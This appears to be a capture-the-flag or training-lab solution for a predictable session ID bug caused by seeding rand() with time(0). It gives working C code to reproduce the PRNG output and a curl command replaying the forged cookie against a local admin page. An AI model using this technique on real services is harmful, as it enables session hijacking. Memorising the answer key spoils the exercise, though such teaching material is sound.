# Solution — 05 · Predictable Session ID

**Code**: `session_manager.cpp` → `srand(time(0)); ... rand()`.

Given a target session was minted at `T` (a unix epoch second), an
attacker recreates the same PRNG state:

```c
srand(T);
uint32_t predicted = rand();
printf("SESSION_%u\n", predicted);
```

Then hijacks with:

```bash
curl -H "Cookie: session_id=SESSION_<predicted>" http://127.0.0.1:8081/admin/
```

Try a small window around `time(0)` (e.g. ±3 seconds) to cover clock skew.
